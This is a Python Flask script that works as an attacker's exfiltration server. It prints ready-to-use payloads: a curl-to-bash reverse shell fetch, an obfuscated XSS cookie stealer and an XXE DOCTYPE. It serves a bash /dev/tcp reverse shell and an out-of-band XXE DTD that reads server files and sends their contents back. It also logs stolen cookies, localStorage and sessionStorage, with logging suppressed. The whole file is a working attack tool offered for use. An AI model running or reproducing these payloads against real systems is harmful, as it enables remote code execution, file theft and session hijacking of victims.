#!/usr/bin/env python3
from flask import Flask,Response,request
import sys,logging,argparse,socket,netifaces
log=logging.getLogger('werkzeug')
log.disabled=True
cli=sys.modules['flask.cli']
cli.show_server_banner=lambda*x:None
p=argparse.ArgumentParser()
p.add_argument('-i',required=True,help='IP or interface name')
a=p.parse_args()
if a.i.replace('.','').isdigit():
 ip=a.i
else:
 try:ip=netifaces.ifaddresses(a.i)[netifaces.AF_INET][0]['addr']
 except:print('Interface not found');sys.exit(1)
app=Flask(__name__)
l={}
print("""
\033[38;5;208m** Exfil using routes! **\033[0m
🐚: curl${IFS}http://%s/rev/443|bash
🍪: <svg%%0Conload="\\u0064ocument.write('<img%%0Csrc=http://%s?c='%%2b\\u0064ocument.cookie%%2b'>')"/>
🗂️: Content-Type: text/xml <?xml version="1.0"?><!DOCTYPE x SYSTEM "http://%s/dtd"><x>&e1;</x>
"""%(ip,ip,ip))
@app.route('/rev/<int:p>')
def r(p):
 payload=f'bash -i >& /dev/tcp/{ip}/{p} 0>&1'
 return Response(payload,mimetype='text/plain')
@app.route('/dtd')
def dtd():
 data=request.args.get('data')
 if data is None:
  f=request.args.get('file')or'/proc/self/cwd'
  l[request.remote_addr]=f
  return Response(f'<!ENTITY % file SYSTEM "file://{f}"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{ip}/dtd?data=%file;\'>">%eval;%exfil;',mimetype='application/xml')
 print('----------------------------------------------------')
 print('\033[92mConnected\033[0m')
 print('Host: '+request.remote_addr)
 print('User-Agent: '+request.headers.get('User-Agent',''))
 print('File: '+l.get(request.remote_addr,''))
 print(data)
 if l.get(request.remote_addr)=='/proc/self/cwd':
  print('\033[92mRead the file system using the route /dtd?file=<directory/file>\033[0m')
 print('----------------------------------------------------')
 print()
 return'',204
@app.route('/',methods=['GET','POST'])
def h():
 d=request.args.get('c')or request.get_data(as_text=True)or''
 if d:
  p=d.split(',')
  print('----------------------------------------------------')
  print('\033[92mConnected\033[0m')
  print('Host: '+request.remote_addr)
  print('User-Agent: '+request.headers.get('User-Agent',''))
  print('Cookies: '+(p[0]if len(p)>0 else''))
  print('localStorage: '+(p[1]if len(p)>1 else''))
  print('sessionStorage: '+(p[2]if len(p)>2 else''))
  print('----------------------------------------------------')
  print()
 return'',204
if __name__=="__main__":
 app.run(host='0.0.0.0',port=80,debug=False)
